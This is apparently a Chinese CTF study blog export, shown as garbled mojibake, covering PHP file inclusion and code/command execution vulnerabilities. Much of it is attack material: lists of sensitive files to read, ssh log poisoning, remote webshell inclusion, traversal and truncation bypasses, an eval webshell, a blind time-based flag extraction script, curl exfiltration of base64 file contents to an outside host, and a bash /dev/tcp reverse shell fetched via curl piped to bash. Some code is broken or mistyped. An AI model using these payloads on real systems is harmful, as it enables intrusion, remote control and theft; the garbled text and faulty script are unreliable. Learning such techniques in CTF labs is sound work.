å…¶ä¸­includeå’Œrequireçš„åŒºåˆ«ä¸»è¦æ˜¯includeåœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿è¡Œï¼›è€Œrequireå‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚ include_onceï¼Œrequire_onceè¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ï¼Œé€‚ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œä½ æƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚ å››ã€æ¼æ´åˆ©ç”¨æ–‡ä»¶åŒ…å«åˆ©ç”¨æœ‰ä¸¤ç§ 1.åŒ…å«æœ¬åœ°æœåŠ¡å™¨çš„æ–‡ä»¶ 2.åŒ…å«å…¶ä»–æœåŠ¡å™¨çš„æ–‡ä»¶ è€Œä¸”ï¼ŒåŒ…å«çš„æ—¶å€™ï¼Œä¸ä¸€å®šè¦åŒ…å«phpæ–‡ä»¶ åªè¦æ–‡ä»¶ä¸­æœ‰ä¸€å—å®Œæ•´çš„phpä»£ç å³å¯ ä¾‹å¦‚a.txt å†…å®¹ä¸º &lt;?php phpinfo(); ?&gt; ä¹Ÿæ˜¯å¯ä»¥çš„ 1.åŒ…å«æœ¬åœ°æœåŠ¡å™¨çš„æ–‡ä»¶ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œåˆ©ç”¨CTFSHOWçš„é¶æœº &lt;?php if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } è¿™é‡Œæ²¡æœ‰åšä»»ä½•é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼ˆç½—åˆ—ä¸€äº›å¸¸ç”¨çš„ï¼Œå…¶ä»–çš„å¸ˆå‚…ä»¬å¯ä»¥è‡ªè¡Œæ”¶é›†ï¼‰ /etc/apache2/* #Apacheé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥è·çŸ¥Webç›®å½•ã€æœåŠ¡ç«¯å£ç­‰ä¿¡æ¯ /etc/nginx/* #Nginxé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥è·çŸ¥Webç›®å½•ã€æœåŠ¡ç«¯å£ç­‰ä¿¡æ¯ /etc/crontab #å®šæ—¶ä»»åŠ¡æ–‡ä»¶ /etc/environment #ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶ä¹‹ä¸€ã€‚ç¯å¢ƒå˜é‡å¯èƒ½å­˜åœ¨å¤§é‡ç›®å½•ä¿¡æ¯çš„æ³„éœ²ï¼Œç”šè‡³å¯èƒ½å‡ºç°secret keyæ³„éœ²çš„æƒ…å†µ /etc/hostname #ä¸»æœºå /etc/hosts #ä¸»æœºåæŸ¥è¯¢é™æ€è¡¨ï¼ŒåŒ…å«æŒ‡å®šåŸŸåè§£æIPçš„æˆå¯¹ä¿¡æ¯ã€‚é€šè¿‡è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥æ¢æµ‹ç½‘å¡ä¿¡æ¯å’Œå†…ç½‘IP/åŸŸå /etc/issue #ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ /etc/mysql/* #MYSQLé…ç½®æ–‡ä»¶ /etc/php/* #PHPé…ç½®æ–‡ä»¶ /proc ç›®å½• #/procç›®å½•é€šå¸¸å­˜å‚¨ç€è¿›ç¨‹åŠ¨æ€è¿è¡Œçš„å„ç§ä¿¡æ¯ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ç§è™šæ‹Ÿç›®å½•ï¼Œå¦‚æœæŸ¥çœ‹éå½“å‰è¿›ç¨‹çš„ä¿¡æ¯ï¼Œpidæ˜¯å¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£çš„ï¼Œå¦‚æœè¦æŸ¥çœ‹å½“å‰è¿›ç¨‹ï¼Œåªéœ€/proc/selfä»£æ›¿/proc/[pid]å³å¯ /proc/[pid]/cmdline #cmdlineå¯è¯»å‡ºæ¯”è¾ƒæ•æ„Ÿçš„ä¿¡æ¯ # sshæ—¥å¿—ï¼Œæ”»å‡»æ–¹æ³•ï¼š ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1 /var/log/auth.log # apacheæ—¥å¿— /var/log/apache2/[access.log|error.log] https://www.anquanke.com/post/id/231407 è¿™é‡Œå¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è¯•ç€è¯»/etc/passwd 2.åŒ…å«è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶è¿™é‡Œéœ€è¦å‰æ allow_url_fopen = On æ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶ allow_url_include = On æ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶ è¿™é‡Œå¯ä»¥æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œåˆ©ç”¨è™šæ‹Ÿæœºåšè¿œç¨‹æœåŠ¡å™¨ &lt;?php error_reporting(0); highlight_file(__FILE__); $filename = $_GET['page']; Include($filename); ?&gt; è¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ â€œæœåŠ¡å™¨â€ä¸Šå­˜åœ¨webshell ä¼ å‚ï¼š http://localhost/include.php?page=http://192.168.179.129/1.php å¯ä»¥çœ‹åˆ°æˆåŠŸåŒ…å«åˆ°äº†webshell 3.é™åˆ¶åç¼€åä¾‹å­ &lt;?php error_reporting(0); highlight_file(__FILE__); $filename = $_GET['page']; include($filename. \".H3h3QAQ\"); ?&gt; å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿›è¡ŒåŒ…å«æ–‡ä»¶çš„æ—¶å€™æ–‡ä»¶ååç¼€è¿›è¡Œäº†æ‹¼æ¥ï¼Œå¼ºåˆ¶åç¼€ä¸ºH3h3QAQ æ‰€ä»¥æˆ‘ä»¬éœ€è¦Bypass (1).%00æˆªæ–­éœ€è¦PHP&lt;5.3.4å¹¶ä¸”magic_quotes_gpc = Off /include.php?page=info.txt%00 (2).é•¿åº¦æˆªæ–­PHPç‰ˆæœ¬&lt;=5.2.? Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒæ‰Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒæ‰ æ„é€ payloadçš„æ—¶å€™è¶…å‡ºé™åˆ¶å³å¯ ç±»ä¼¼äº /include.php?page=info.txt....................*n (3).ä¼ªåè®®zip://æ–‡ä»¶è·¯å¾„/zipæ–‡ä»¶åç§°#å‹ç¼©åŒ…å†…çš„æ–‡ä»¶åç§° ï¼ˆä½¿ç”¨æ—¶æ³¨æ„å°†#å·è¿›è¡ŒURLç¼–ç ï¼‰ phar://æ–‡ä»¶è·¯å¾„/pharæ–‡ä»¶åç§°/pharå†…çš„æ–‡ä»¶åç§° phar://åè®®ä¸zip://ç±»ä¼¼ï¼ŒåŒæ ·å¯ä»¥è®¿é—®zipæ ¼å¼å‹ç¼©åŒ…å†…å®¹ å¤šé…åˆåœ¨ä¸Šä¼ é¢˜ä½¿ç”¨ è‹¥å‘ç°åªæœ‰jpgã€pngæ‰å¯ä»¥ä¸Šä¼ æ–‡ä»¶ åˆ™å¯ä»¥åˆ©ç”¨pharä¼ªåè®® å†™ä¸€ä¸ªshell å°†åç¼€åæ”¹æˆ.php å†å°†å…¶å‹ç¼©ï¼Œå†æ”¹æˆ*.jpgã€*.png æ­¤æ—¶å¯ä»¥ä¸Šä¼ æç¤ºæˆåŠŸåï¼Œåˆ©ç”¨èœåˆ€æ·»åŠ /include.php?file=phar*://***/a.png/aå³å¯ ?file=zip://D:\\zip.jpg%23phpinfo ?file=phar://zip.zip/phpinfo 4.é™åˆ¶å‰ç¼€ä¾‹å¦‚../è¢«è¿‡æ»¤ å¯ä»¥åˆ©ç”¨urlç¼–ç  ../ %2e%2e%2f ..%2f %2e%2e/ æˆ–è€…äºŒæ¬¡ç¼–ç  ../ %252e%252e%252f 5.PHPä¼ªåè®®(1).file:// åè®®ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚include()/require()/include_once()/require_once()å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œå¦‚å¯¼å…¥ä¸ºé.phpæ–‡ä»¶ï¼Œåˆ™ä»æŒ‰ç…§phpè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ˜¯include()å‡½æ•°æ‰€å†³å®šçš„ã€‚ POC /include.php?file=file://phpinfo.txt /include.php?file=http://127.0.0.1/phpinfo.txt (2).php://åè®®allow_url_include :ä»…php://input php://stdin php://memory php://temp éœ€è¦on php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://inputï¼Œphp://filterç”¨äºè¯»å–æºç ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚ åè®® ä½œç”¨ php://input å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„dataéƒ¨åˆ†ï¼Œåœ¨enctype=\"multipart/form-data\" çš„æ—¶å€™php://input æ˜¯æ— æ•ˆçš„ã€‚ php://output åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚ php://fd (&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ php://fd/3 å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚ php://memory php://temp (&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ php://memory æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ php://temp ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ sys_get_temp_dir() çš„æ–¹å¼ä¸€è‡´ã€‚ php://filter (&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚ 1.php://filterphp://filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ å¯¹äºphp://æ¥è¯´ï¼Œæ˜¯æ”¯æŒå¤šç§è¿‡æ»¤å™¨åµŒå¥—çš„ php://filter/[read|write]=[è¿‡æ»¤å™¨1]|[è¿‡æ»¤å™¨2]/resource=æ–‡ä»¶åç§°ï¼ˆåŒ…å«åç¼€åï¼‰ #å¦‚æœ|è¢«è¿‡æ»¤æ‰äº†ï¼Œå¯ä»¥ä½¿ç”¨å¤šè¿‡æ»¤å™¨: php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=æ–‡ä»¶åç§°ï¼ˆåŒ…å«åç¼€åï¼‰ åµŒå¥—è¿‡ç¨‹çš„æ‰§è¡Œæµç¨‹ä¸ºä»å·¦åˆ°å³ å…¶å®æ˜¯å¯ä»¥ç®€å†™æˆè¿™æ ·çš„php://filter/[è¿‡æ»¤å™¨] ï¼Œphpä¼šè‡ªå·±è¿›è¡Œè¯†åˆ«ã€‚ è¿‡æ»¤å™¨åˆ—è¡¨: è¿‡æ»¤å™¨åç§° è¯´æ˜ ç±»åˆ« ç‰ˆæœ¬ string.rot13 rot13è½¬æ¢ å­—ç¬¦ä¸²è¿‡æ»¤å™¨ PHP&gt;4.3.0 string.toupperã€string.tolower å¤§å°å†™äº’è½¬ å­—ç¬¦ä¸²è¿‡æ»¤å™¨ PHP&gt;5.0.0 convert.base64-encodeã€convert.base64-decode base64ç¼–ç è½¬æ¢ è½¬æ¢è¿‡æ»¤å™¨ PHP&gt;5.0.0 convert.quoted-printable-encodeã€convert.quoted-printable-decode URLç¼–ç è½¬æ¢ è½¬æ¢è¿‡æ»¤å™¨ PHP&gt;5.0.0 convert.iconv.ç¼–ç 1.ç¼–ç 2 ä»»æ„ç¼–ç è½¬æ¢ è½¬æ¢è¿‡æ»¤å™¨ PHP&gt;5.0.0 zlib.deflateã€zlib.inflate zlibå‹ç¼© å‹ç¼©è¿‡æ»¤å™¨ PHP&gt;5.1.0 bzip2.compressã€bzip2.decompress zlibå‹ç¼© å‹ç¼©è¿‡æ»¤å™¨ PHP&gt;5.1.0 6.PHPä¼ªåè®®å¸¸ç”¨å‡½æ•°file_get_contents() file_put_contents() readfile() fopen() file() show_source() highlight_file() äº”ã€å‚è€ƒé“¾æ¥ https://blog.csdn.net/qq_42181428/article/details/87090539 https://blog.csdn.net/bmth666/article/details/104616201 https://www.anquanke.com/post/id/231407#h3-6 https://www.cnblogs.com/jzking121/p/15144416.html https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430 https://segmentfault.com/a/1190000018991087","categories":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"PHPä»£ç æ‰§è¡Œæ¼æ´","slug":"PHPä»£ç æ‰§è¡Œæ¼æ´","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-11T03:48:16.317Z","comments":true,"path":"posts/12a5c357.html","link":"","permalink":"http://h3geeker.top/posts/12a5c357.html","excerpt":"","text":"ä»£ç å‘½ä»¤æ‰§è¡Œå‡½æ•°ä»£ç æ‰§è¡Œ å‡½æ•° è¯´æ˜ ä¾‹å­ ${phpä»£ç } ${phpinfo}; mixed eval(string $code) æŠŠå­—ç¬¦ä¸²codeä½œä¸ºphpä»£ç æ‰§è¡Œ eval(â€˜phpinfo();â€™); bool assert(mixed $assertion [, string $description]) assert()ä¼šæ£€æŸ¥æŒ‡å®šçš„assertionå¹¶åœ¨ç»“æœä¸ºFALSEæ—¶é‡‡å–é€‚å½“çš„ç›¸åº”ã€‚å¦‚æœassertionæ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢«assert()å½“ä½œPHPä»£ç æ¥æ‰§è¡Œ assert(â€˜system(â€œwhoamiâ€)â€™); mixed preg_replace(mixde $patterm,mixed $replacement,mixed $subject [, int $limit =-1 [, int&amp;$count]]) æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚å½“$patternå¤„å­˜åœ¨eä¿®é¥°ç¬¦æ˜¯(5.5.0ç‰ˆæœ¬/eä¿®é¥°ç¬¦å·²ç»è¢«å¼ƒç”¨äº†)ï¼Œ$replacementä¼šè¢«å½“åšphpä»£ç æ‰§è¡Œ preg_replace(â€œ/test/eâ€,â€system(â€˜whoamiâ€™)â€,â€™testâ€™); mixed call_user_func(callable $callback [, mixed $paramenter [, mixed $..]]) ç¬¬ä¸€ä¸ªå‚æ•°callbackæ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚ä¼ å…¥call_user_func()çš„å‚æ•°ä¸èƒ½ä¸ºå¼•ç”¨ä¼ é€’ call_user_func(â€˜systemâ€™,â€™whoamiâ€™); mixed call_user_func_array(callable $callback,arry $param_arr) æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„(param_arr)ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ä¼ å…¥ call_user_func_array(â€˜systemâ€™,array(â€˜whoamiâ€™)); string creat)function( string $args,string $code) åœ¨phpä¸­ä½¿ç”¨creat_function()åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°(lambda-style)ï¼Œå¦‚æœå¯¹å‚æ•°ä¸ºè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å®¡æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤ç‰¹æ®Šå­—ç¬¦ä¸²ç»™creat_function()ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ creat_function(â€˜$testâ€™,â€™};phpinfo();/*â€™); array array_map(callable $callback ,array $array1 [, array $â€¦]) ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°ã€‚å…¶è¿”å›å€¼ä¸ºæ•°ç»„ï¼Œæ˜¯ä¸ºarray1æ¯ä¸ªå…ƒç´ åº”ç”¨callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚callbackå‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™array_map()æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚ array_map(â€˜systemâ€™,array(â€˜whoamiâ€™)); array array_filter (array $array [, callable $callback [, int $flag=0]]) ä¾æ¬¡å°†arrayæ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ°callbackå‡½æ•°ã€‚å¦‚æœcallbackå‡½æ•°è¿”å›trueï¼Œåˆ™arrayæ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿æŒä¸å˜ array_filter(array(â€˜whoamiâ€™),â€™systemâ€™); bool usort( array &amp;$array,callabe $value_compare_func) é€šè¿‡ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„è¿›è¡Œæ’åº $a=array(â€˜whoamiâ€™,â€™tâ€™);usort($a,â€systemâ€); bool uasort(array &amp;$array, callable $value_compare_func) ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åºå¹¶ä¿æŒç´¢å¼•å…³è” $a=array(â€˜whoamiâ€™,â€™tâ€™);uasort($a,â€systemâ€); å‘½ä»¤æ‰§è¡Œ å‡½æ•° è¯´æ˜ ä¾‹å­ string system( string $command [, int &amp;$return_var] ) commandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å¦‚æœæä¾›return_varå‚æ•°ï¼Œåˆ™å¤–éƒ¨å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€å°†ä¼šè¢«è®¾ç½®åˆ°æ­¤å˜é‡ä¸­ï¼Œæ˜¾ç¤ºè¾“å‡º system(â€˜whoamiâ€™); void passthru ( string $command [, int &amp;$return_var]) æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º passthru(â€˜whoamiâ€™); void pcntl_exec(string $path [, arry $args [, array $envs]] ) pathæ˜¯å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æˆ–ä¸€ä¸ªåœ¨æ–‡ä»¶ç¬¬ä¸€è¡ŒæŒ‡å®šäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ ‡å¤´çš„è„šæœ¬argsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºçš„å‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚è¯¥æ¨¡å—ä¸èƒ½åœ¨éUnixå¹³å°ï¼ˆWindowsï¼‰ä¸Šè¿è¡Œ pcntl_exec(â€œ/bin/cat/etc/passwdâ€,â€râ€);$read=fread($handle,2096);echo $read;pclose($handle); string exec (string $command [, array &amp;$output [, int &amp;$return_bar]]) æ‰§è¡Œæ‰€æŒ‡å®šçš„å‘½ä»¤ï¼Œå¹¶è¿”å›ç»“æœçš„æœ€åä¸€è¡Œå†…å®¹ï¼Œä¸æ˜¾ç¤ºè¾“å‡º echo exec(â€˜whoamiâ€™); string shell_exec(string $cmd) é€šè¿‡shellç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å› echo shell_exec(â€˜whoamiâ€™); resource popen(string $command,string $mode) æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹è¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„commandå‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿã€‚åé¢çš„modeï¼Œå½“ä¸ºâ€™râ€™ï¼Œè¿”å›çš„æ–‡ä»¶æŒ‡é’ˆç­‰äºå‘½ä»¤çš„STDOUTï¼Œå½“ä¸ºâ€™wâ€™ï¼Œè¿”å›çš„æ–‡ä»¶æŒ‡é’ˆç­‰äºå‘½ä»¤çš„STDIN $handle = popen(â€œbin/cat/etc/passwdâ€,â€râ€);$read=fread($handle,2096);echo $read;pclose($handle); åå¼•å· echo whoami;(mdè¯­æ³•é—®é¢˜) æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ&lt;?php highlight_file(__FILE__); if (isset($_GET['cmd'])){ shell_exec($_GET['cmd']); } è¯¥ç¯å¢ƒä¸ºä¸€ä¸ªæ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸ ä»¥ä¸‹æ–¹å¼å¯ä»¥åˆ¤æ–­æ˜¯å¦æˆåŠŸRCE åˆ¤æ–­1. å»¶è¿Ÿ ?cmd=sleep 3 é€šè¿‡æ˜¯å¦å»¶æ—¶æ¥åˆ¤æ–­è¯¥æ¡å‘½ä»¤æ˜¯å¦æœ‰æ‰§è¡Œï¼Œæœ‰å»¶æ—¶åˆ™ä»£è¡¨å‘½ä»¤æœ‰æ‰§è¡Œ 2.HTTPè¯·æ±‚ (1).åœ¨å…¬ç½‘æœåŠ¡å™¨ç›‘å¬ç«¯å£ nc -lvp port (2).å‘ç›®æ ‡æœåŠ¡å™¨å‘èµ·httpè¯·æ±‚ï¼Œæ‰§è¡Œcurlå‘½ä»¤ ?cmd=curl ip:port å¦‚æœå‘ç›®æ ‡æœåŠ¡å™¨å‘èµ·htppè¯·æ±‚åï¼Œå…¬ç½‘æœåŠ¡å™¨ç›‘å¬ç«¯å£å¾—åˆ°ä¸€äº›ä¿¡æ¯ï¼Œå°±è¯æ˜æµ‹è¯•ç‚¹å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ 3.DNSè¯·æ±‚ dnslog ?cmd=ping 9y8y3k.dnslog.cn åˆ©ç”¨1.ä½¿ç”¨ &gt;æˆ–&gt;&gt; ?cmd=cat flag.php &gt; flag.txt 2.mvæˆ–cp ?cmd=mc flag.php flag.txt ?cmd=cp flag.php flag.txt 3.æ‰“åŒ…å‹ç¼© (1).taræ‰“åŒ…æˆ–taræ‰“åŒ…å¹¶å‹ç¼© tar cvf flag.tar flag.php tar zcvf flag.tar.gz flag.php (2).zipå‹ç¼© zip flag.zip flat.php 4.cut and sleep sedæŒ‡å®šè¯»å–æ–‡ä»¶çš„ç¬¬å‡ è¡Œ cat flag.php|sed -n '2p' æå–æ¯ä¸€è¡Œçš„ç¬¬ä¸‰ä¸ªå­—èŠ‚ cut -b 3 flagæ–‡ä»¶ æœ€å cat flag.php|sed -n '2p'|cut -b 1 exp import requests import time url =\"\" flag= \"\" for i in range (6,65): for j in range(32,127): data=\"a%3D`cat flag.php|sed -n '2p'|cut -b {}`;[$a %3D \\\"{}\\\"] %26%26 sleep2\".format(i,chr(j)) start_time=time.time() requests.get(url=url+data) spend_time=end_time -start_time if spend_time&gt;=2: flag+=chr(j) print(flag) å†™å…¥webshellç›´æ¥å†™å…¥?cmd = echo \"&lt;?php @eval(\\$_POST[h3]);?&gt;\"&gt;webshell.php å¤–éƒ¨ä¸‹è½½wget ç½‘å€ -O webshell.php #ä½¿ç”¨wgetä¸‹è½½shellï¼Œä½¿ç”¨å‚æ•°-Oæ¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶å Dnslog1.å‘½ä»¤æ‰§è¡Œæ—¶è¦é¿å…ç©ºæ ¼ï¼Œç©ºæ ¼ä¼šå¯¼è‡´ç©ºæ ¼åé¢çš„å‘½ä»¤æ‰§è¡Œä¸åˆ°ï¼› 2.å°†è¯»å–çš„æ–‡ä»¶å‘½ä»¤ç”¨åå¼•å·``åŒ…æ‹¬èµ·æ¥ï¼› 3.æ‹¼åŠ²çš„åŸŸååˆé•¿åº¦é™åˆ¶ ç”¨&lt;æ›¿æ¢è¯»å–æ–‡ä»¶ä¸­çš„ç©ºæ ¼ï¼Œä¸”å¯¹è¾“å‡ºç»“æœbase64ç¼–ç  curl `cat&lt;flag.php|base64` æ‹¼æ¥åŸŸåï¼ˆæœ€ç»ˆæ„é€ ç»“æœï¼‰ curl `cat&lt;flag.php|base64`. åå¼¹shell1.é¦–å…ˆåœ¨å…¬ç½‘æœåŠ¡å™¨ç”¨ncæŒ‡ä»¤ç›‘å¬ç«¯å£ nc -lvp port 2.ç„¶ååœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šå†™ä¸€ä¸ªæ–‡ä»¶ï¼ˆqwzfæ–‡ä»¶ï¼‰ bash -i &gt;&amp;/dev/tcp/ip/poat 0&gt;&amp;1 3.åœ¨æµè§ˆå™¨æ‰§è¡Œ ?cmd=curl ip:port/qwzf|bush æœ‰é™å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ##14ä½å¯æ§ &lt;?php highlight_file(__FILE__); if (strlen($_GET[1])&lt;15){ echo strlen($_GET[1]); echo shell_exec($_GET[1]); }else{ exit(\"too long~\"); } è™½ç„¶åªèƒ½ä¼ å…¥14ä¸ªå­—ç¬¦ ä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶å‘½ä»¤æ‰§è¡Œæ¬¡æ•° æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡Linuxä¸‹çš„&gt;ç¬¦å·ä¸&gt;&gt;ç¬¦å·å†™å…¥ä¸€æ®µwebshellåˆ°æŒ‡å®šæ–‡ä»¶ã€‚ echo \\&lt;?php&gt;1 echo eval\\(&gt;&gt;1 echo \\$_GET&gt;&gt;1 echo \\[1\\]&gt;&gt;1 echo \\)\\;&gt;&gt;1 mv 1 1.php æœ¬åœ°èµ·ç¯å¢ƒ ç»æµ‹è¯• è¿™ç§æ¢å·çš„phpæ–‡ä»¶ä¹Ÿå¯ä»¥è¿è¡Œ 